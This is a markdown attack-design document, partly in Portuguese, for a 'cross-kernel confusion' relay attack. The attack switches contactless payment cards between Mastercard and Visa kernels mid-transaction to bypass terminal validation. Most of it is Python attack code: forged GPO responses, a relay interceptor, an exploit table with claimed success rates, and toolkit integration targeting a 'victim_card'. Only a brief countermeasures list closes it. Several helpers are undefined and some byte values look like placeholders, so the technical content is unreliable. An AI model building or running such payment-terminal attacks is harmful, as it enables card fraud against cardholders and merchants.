# Attack Vector 3: Cross-Kernel Confusion Attack

## Concept
**Name:** "Cross-Scheme Confusion"  
**Target:** Terminals that process multiple card schemes (Mastercard/Visa)
**Objective:** Switch between different processing kernels during the transaction to exploit implementation differences and create validation inconsistencies.

## Technical Description

### Attack Flow
1. **Initial Selection**: Card se identifica como um esquema (ex: Mastercard)
2. **Kernel Switch**: Durante GPO, muda para protocolo de outro esquema (ex: Visa)
3. **Mixed Processing**: Terminal processa com lógica híbrida/inconsistente
4. **Exploitation**: Aproveita diferenças de validação entre kernels

### Vulnerable Components
- **AID Selection Logic**: Seleção de Application Identifier
- **Kernel Processing**: Diferenças entre Mastercard Kernel 2 vs Visa Kernel 3
- **Data Element Validation**: Validação inconsistente de campos TLV
- **Transaction Flow**: Diferentes fluxos de autorização entre esquemas

### Implementation Details

#### Core Cross-Kernel Logic (Python)
```python
class CrossKernelAttack:
    def __init__(self, relay_server):
        self.relay_server = relay_server
        self.kernel_configs = self.load_kernel_configurations()
        self.current_kernel = None
        self.target_kernel = None
        
    def load_kernel_configurations(self):
        """
        Carrega configurações específicas de cada kernel
        """
        return {
            'mastercard_k2': {
                'aid': 'A0000000041010',  # Mastercard Credit
                'processing_options': {
                    'pdol_format': 'TTQ_AMOUNT_COUNTRY_CURRENCY_DATE_TYPE_UN',
                    'gpo_response_format': 'AIP_AFL_TRACK2_IAD_AC_CID_ATC_CTQ',
                    'auth_methods': ['SDA', 'DDA', 'CDA'],
                    'cvm_methods': ['NoPIN', 'OnlinePIN', 'CDCVM']
                },
                'data_elements': {
                    '9F02': 'Amount',
                    '9F03': 'Amount Other', 
                    '9F1A': 'Terminal Country Code',
                    '95': 'TVR',
                    '9A': 'Transaction Date',
                    '9C': 'Transaction Type',
                    '9F37': 'Unpredictable Number'
                }
            },
            'visa_k3': {
                'aid': 'A0000000031010',  # Visa Credit
                'processing_options': {
                    'pdol_format': 'TTQ_AMOUNT_COUNTRY_CURRENCY_DATE_TYPE_UN',
                    'gpo_response_format': 'AIP_AFL_TRACK2_IAD_AC_CID_ATC_CTQ',
                    'auth_methods': ['EMV', 'DDA'],  # Different from MC
                    'cvm_methods': ['NoPIN', 'OnlinePIN']
                },
                'data_elements': {
                    '9F02': 'Amount',
                    '9F1A': 'Terminal Country Code',
                    '9F33': 'Terminal Capabilities',  # Visa-specific
                    '9F40': 'Additional Terminal Capabilities',  # Visa-specific
                    '9F37': 'Unpredictable Number'
                }
            }
        }
    
    def initiate_kernel_confusion(self, initial_kernel, target_kernel):
        """
        Inicia ataque de confusão entre kernels
        """
        self.current_kernel = initial_kernel
        self.target_kernel = target_kernel
        
        # Phase 1: Establish initial kernel
        self.establish_initial_kernel()
        
        # Phase 2: Switch kernel mid-transaction
        self.execute_kernel_switch()
        
        # Phase 3: Exploit mixed processing
        self.exploit_mixed_validation()
    
    def establish_initial_kernel(self):
        """
        Estabelece kernel inicial através de SELECT
        """
        initial_config = self.kernel_configs[self.current_kernel]
        
        # Send SELECT with initial AID
        select_response = {
            'aid': initial_config['aid'],
            'fci': self.build_fci_template(initial_config),
            'status': '9000'
        }
        
        return self.send_apdu_response(select_response)
    
    def execute_kernel_switch(self):
        """
        Executa mudança de kernel durante GPO
        """
        target_config = self.kernel_configs[self.target_kernel]
        
        # Intercept GPO request
        def gpo_interceptor(gpo_request):
            # Respond with target kernel format
            return self.build_gpo_response_for_kernel(self.target_kernel, gpo_request)
        
        self.relay_server.register_interceptor('GPO', gpo_interceptor)
    
    def build_gpo_response_for_kernel(self, kernel, gpo_request):
        """
        Constrói resposta GPO para kernel específico
        """
        config = self.kernel_configs[kernel]
        
        if kernel == 'visa_k3':
            # Visa-specific GPO response structure
            return self.build_visa_gpo_response(gpo_request)
        elif kernel == 'mastercard_k2':
            # Mastercard-specific GPO response structure
            return self.build_mastercard_gpo_response(gpo_request)
    
    def build_visa_gpo_response(self, gpo_request):
        """
        Constrói resposta GPO no formato Visa
        """
        # Visa uses different AIP structure
        aip_visa = bytearray([0x20, 0x00])  # DDA supported, no CDA
        
        # Visa-specific IAD format
        iad_visa = bytearray([
            0x1F,  # IAD length
            0x01,  # IAD format version
            0x02,  # Derivation key index
            0x03,  # Card verification results
            0x04,  # DAC/ICC Dynamic Number
            # ... additional Visa-specific fields
        ])
        
        gpo_response = {
            'aip': aip_visa,
            'afl': b'\x08\x01\x01\x00',  # Application File Locator
            'iad': iad_visa,
            'track2': self.generate_track2_equivalent(),
            'status': '9000'
        }
        
        return self.encode_gpo_response(gpo_response)
    
    def build_mastercard_gpo_response(self, gpo_request):
        """
        Constrói resposta GPO no formato Mastercard
        """
        # Mastercard AIP structure
        aip_mc = bytearray([0x5C, 0x00])  # CDA supported
        
        # Mastercard-specific IAD format  
        iad_mc = bytearray([
            0x0E,  # IAD length
            0x84,  # Application Transaction Counter
            0x00,  # Application Cryptogram
            # ... Mastercard-specific fields
        ])
        
        gpo_response = {
            'aip': aip_mc,
            'afl': b'\x08\x01\x02\x00',
            'iad': iad_mc,
            'track2': self.generate_track2_equivalent(),
            'status': '9000'
        }
        
        return self.encode_gpo_response(gpo_response)

# Advanced Kernel Exploitation Techniques
class KernelExploitationEngine:
    def __init__(self):
        self.exploit_database = self.load_kernel_exploits()
        
    def load_kernel_exploits(self):
        """
        Database de exploits específicos por kernel
        """
        return {
            'mc_to_visa_switch': {
                'description': 'Switch from MC CDA to Visa DDA mid-transaction',
                'timing': 'During GPO response',
                'payload': self.build_mc_visa_payload,
                'success_rate': 0.75
            },
            'visa_to_mc_switch': {
                'description': 'Switch from Visa EMV mode to MC offline',
                'timing': 'During READ RECORD',
                'payload': self.build_visa_mc_payload,
                'success_rate': 0.68
            },
            'dual_kernel_response': {
                'description': 'Send responses for both kernels simultaneously',
                'timing': 'Parallel to legitimate response',
                'payload': self.build_dual_kernel_payload,
                'success_rate': 0.82
            }
        }
    
    def build_mc_visa_payload(self, transaction_context):
        """
        Constrói payload para switch Mastercard → Visa
        """
        # Start with Mastercard SELECT
        mc_select = {
            'aid': 'A0000000041010',
            'label': 'MASTERCARD',
            'priority': 0x01
        }
        
        # Switch to Visa processing during GPO
        visa_gpo = {
            'aip': b'\x20\x00',  # Visa DDA format
            'processing_mode': 'visa_contactless',
            'ttq': b'\x80\x00\x00\x00'  # Visa TTQ format
        }
        
        return {
            'select_phase': mc_select,
            'gpo_phase': visa_gpo,
            'exploit_timing': 0.025  # 25ms window
        }
    
    def exploit_data_element_confusion(self, kernel_mix):
        """
        Explora confusão em elementos de dados entre kernels
        """
        # Mastercard uses Tag 9F6E for Enhanced Contactless Reader Capabilities
        # Visa uses Tag 9F7A for different purpose
        
        confusion_tags = {
            '9F6E': {
                'mastercard': 'Enhanced Contactless Reader Capabilities',
                'visa': 'Undefined/Proprietary',
                'exploit': 'Send MC interpretation to Visa processor'
            },
            '9F7A': {
                'mastercard': 'Reserved',
                'visa': 'VLP Issuer Authorization Code', 
                'exploit': 'Cross-interpret authorization codes'
            }
        }
        
        return self.build_confusion_payload(confusion_tags)

# Terminal Validation Bypass
class CrossKernelValidationBypass:
    def __init__(self):
        self.validation_rules = self.load_validation_differences()
        
    def load_validation_differences(self):
        """
        Carrega diferenças de validação entre kernels
        """
        return {
            'amount_validation': {
                'mastercard': 'Validates amount in PDOL against 9F02',
                'visa': 'Additional validation against transaction limits',
                'bypass': 'Use MC amount format with Visa processor'
            },
            'cryptogram_validation': {
                'mastercard': 'CDA/DDA validation with specific IAD format',
                'visa': 'Different IAD interpretation and validation',
                'bypass': 'Cross-kernel IAD format confusion'
            },
            'cvm_validation': {
                'mastercard': 'Supports CDCVM for contactless',
                'visa': 'Limited CVM support, stricter validation',
                'bypass': 'Announce MC CVM capabilities to Visa'
            }
        }
    
    def exploit_validation_gap(self, gap_type, payload):
        """
        Explora lacuna específica de validação
        """
        rules = self.validation_rules.get(gap_type)
        if not rules:
            return False
            
        # Apply bypass technique
        bypass_payload = self.apply_bypass_technique(rules['bypass'], payload)
        return self.test_bypass_success(bypass_payload)
```

## Framework Integration

### Modifications Required

#### In `core_toolkit` module:
```python
# Add to core_toolkit/kernel_manager/cross_kernel.py
class CrossKernelManager:
    def __init__(self, apdu_builder, tlv_parser):
        self.apdu_builder = apdu_builder
        self.tlv_parser = tlv_parser
        self.active_kernels = {}
        
    def register_kernel_switch(self, from_kernel, to_kernel, switch_point):
        """
        Registra mudança de kernel em ponto específico
        """
        switch_config = {
            'from': from_kernel,
            'to': to_kernel,
            'timing': switch_point,
            'payload_modifier': self.get_kernel_modifier(to_kernel)
        }
        
        return switch_config
```

#### In `exploit_engine` module:
```python
# Add to exploit_engine/attacks/cross_kernel.py
class CrossKernelExploit:
    def __init__(self, relay_server, toolkit):
        self.relay = relay_server
        self.toolkit = toolkit
        self.attack_engine = CrossKernelAttack(relay_server)
        
    def execute_kernel_confusion(self, target_terminal, victim_card):
        """
        Executa ataque de confusão entre kernels
        """
        # Detect supported kernels
        supported = self.detect_terminal_kernels(target_terminal)
        
        # Select optimal kernel combination
        attack_combo = self.select_attack_combination(supported)
        
        # Execute attack
        return self.attack_engine.initiate_kernel_confusion(
            attack_combo['initial'],
            attack_combo['target']
        )
```

## Success Criteria
- Terminal processa transação com lógica híbrida de múltiplos kernels
- Bypass de validações específicas de esquema
- Exploração de diferenças de implementação entre Mastercard/Visa

## Countermeasures
- Validação rigorosa de consistência de kernel durante toda a transação
- Lock de kernel após seleção inicial
- Validação cruzada de elementos de dados específicos do esquema
- Timeout de seleção de aplicação reduzido

## Testing Scenarios
1. **MC→Visa Switch**: Mastercard SELECT seguido de Visa GPO
2. **Visa→MC Switch**: Visa EMV mode para Mastercard CDA
3. **Dual Kernel Response**: Respostas simultâneas de ambos os kernels
4. **Data Element Confusion**: Tags com interpretações diferentes entre esquemas
5. **CVM Cross-Validation**: CDCVM do Mastercard em processador Visa